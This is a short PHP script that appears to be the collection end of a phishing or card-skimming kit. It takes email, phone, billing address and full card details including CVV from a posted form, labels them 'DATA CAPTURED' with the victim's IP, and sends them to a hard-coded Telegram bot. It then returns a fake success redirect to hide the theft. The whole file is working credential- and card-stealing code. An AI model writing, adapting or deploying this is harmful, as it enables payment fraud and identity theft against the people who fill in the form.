<?php
$TG_TOKEN = "8887451622:AAGGo0bZSUKjMPWIqRd5fWY_OvLZajnvee0";
$TG_CHAT  = "8653611398";
$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { echo json_encode(["error" => "no data"]); exit; }
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$time = date('Y-m-d H:i:s');
$card = $input['card'] ?? [];
$billing = $input['billing_address'] ?? [];
$msg = "** UPDATE - DATA CAPTURED\n";
$msg .= "#TIME# {$time} | 🌍 {$ip}\n";
$msg .= "●EMAIL● {$input['email']}\n";
$msg .= "[PHONW] {$input['phone']}\n";
$msg .= "^ADDY^ {$billing['street']}, {$billing['city']}, {$billing['state']} {$billing['zip']}\n";
$msg .= "■CPAN■ Card: {$card['number']} | Exp: {$card['expiry']} | CVV: {$card['cvv']} | Name: {$card['name']}";
$ch = curl_init("https://api.telegram.org/bot{$TG_TOKEN}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query(['chat_id' => $TG_CHAT, 'text' => $msg, 'parse_mode' => 'HTML']),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5
]);
@curl_exec($ch);
curl_close($ch);

echo json_encode(["status" => "ok", "redirect" => "/account"]);
exit;
?>